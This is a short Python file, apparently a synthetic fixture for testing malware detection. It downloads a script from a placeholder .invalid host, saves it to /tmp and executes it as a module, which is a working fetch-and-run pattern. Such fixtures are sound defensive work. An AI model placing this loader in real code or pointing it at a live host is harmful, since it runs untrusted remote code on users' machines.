# FIXTURE ONLY - synthetic detection test sample, not real malware
# A download is saved to a file and loaded as a module from its path. Host is a .invalid domain.
import importlib.util
import urllib.request

path, _ = urllib.request.urlretrieve("https://dl.example.invalid/mod.py", "/tmp/_m.py")
spec = importlib.util.spec_from_file_location("_m", path)
mod = importlib.util.module_from_spec(spec)
spec.loader.exec_module(mod)
